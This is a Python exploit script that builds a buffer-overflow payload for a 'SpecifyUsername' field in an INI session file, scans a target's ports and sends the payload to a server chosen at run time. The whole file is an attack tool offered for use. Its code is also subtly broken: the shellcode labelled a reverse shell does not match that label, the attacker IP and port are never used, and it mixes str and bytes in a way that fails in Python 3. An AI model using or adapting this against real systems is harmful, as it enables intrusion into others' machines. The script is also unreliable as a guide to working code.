#!/usr/bin/env python3
#python3 exploit.py -i <attacker_ip> [-p <port>] [-u <username>] [-s]
import socket
import sys
import time
import argparse
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler()]
)

def generate_payload(ip, port, username):
    """Generate malicious payload with reverse shell shellcode"""
    shellcode = (
        # Linux x86 reverse shell shellcode template
        b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62"
        b"\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
    )
    return "[Bookmarks]\nSpecifyUsername=" + "A"*17000 + "B"*4 + "C"*4 + "D"*4 + shellcode

def send_payload(payload, target_ip, target_port):
    """Send payload to target server"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((target_ip, target_port))
            s.sendall(payload.encode())
            logging.info(f"Payload sent to {target_ip}:{target_port}")
    except socket.timeout:
        logging.error(f"Connection timeout to {target_ip}:{target_port}")
    except ConnectionRefusedError:
        logging.error(f"Connection refused by {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"Payload delivery failed: {str(e)}")

def port_scan(target_ip, scan_type):
    """Scan target for open ports"""
    try:
        logging.info(f"Scanning {target_ip} for open ports...")
        ports = {
            "quick": [22, 80, 443, 3389, 8080],
            "long": list(range(1, 1025))
        }.get(scan_type, [])
        
        open_ports = []
        for port in ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(0.5)
                    s.connect((target_ip, port))
                    open_ports.append(port)
            except:
                continue

        logging.info(f"Open ports found on {target_ip}: {open_ports}")
        return open_ports

    except Exception as e:
        logging.error(f"Port scan failed: {str(e)}")
        return []

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Exploit generator')
    parser.add_argument('-i', '--attacker-ip', required=True, help='Attacker IP address')
    parser.add_argument('-p', '--attacker-port', type=int, default=443, help='Attacker port')
    parser.add_argument('-u', '--username', default='hacked', help='SpecifyUsername value')
    parser.add_argument('-s', '--save', action='store_true', help='Save payload to file')
    args = parser.parse_args()

    # Validate inputs
    if not args.attacker_ip:
        logging.error("Attacker IP required")
        sys.exit(1)

    # Generate payload
    payload = generate_payload(args.attacker_ip, args.attacker_port, args.username)
    logging.info(f"Payload length: {len(payload)} bytes")
    logging.info(f"Payload preview: {payload[:100]}...")

    # Port scanning
    scan_choice = input("\nScan target for open ports? (quick/long/n): ").lower()
    if scan_choice in ["quick", "long"]:
        target_ip = input("Enter target server IP to scan: ").strip()
        open_ports = port_scan(target_ip, scan_choice)
        if open_ports:
            logging.info(f"Suggested target ports: {open_ports}")

    # Payload delivery
    while True:
        send_choice = input("\nSend payload to server? (y/n): ").lower()
        if send_choice == "y":
            target_ip = input("Enter target server IP: ").strip()
            target_port = int(input("Enter target server port: ").strip())
            send_payload(payload, target_ip, target_port)
        else:
            break

    # Save payload
    if args.save:
        with open("malicious_session.ini", "w") as f:
            f.write(payload)
        logging.info("Payload saved to malicious_session.ini")

if __name__ == "__main__":
    main()
